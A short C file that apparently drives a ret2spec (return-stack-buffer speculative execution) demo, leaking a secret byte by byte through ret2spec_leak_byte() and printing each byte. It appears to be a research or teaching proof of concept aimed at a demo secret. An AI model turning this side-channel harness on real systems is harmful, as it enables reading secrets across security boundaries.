#include "trex.h"
#include "demo.h"
#include "ret2spec.h"

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

static void nop(void)
{
}

static void returns_false_recursion(void)
{
	returns_false(RECURSION_DEPTH);
}

int main(void)
{
	trex_demo_init(false, true);

	return_true_base_case = nop;
	return_false_base_case = returns_false_recursion;

	for (size_t i = 0; i < SECRET_LEN; i++) {
		current_offset = i;
		print_leak(ret2spec_leak_byte(), i);
	}

	trex_demo_exit(TREX_SUCCESS);
}
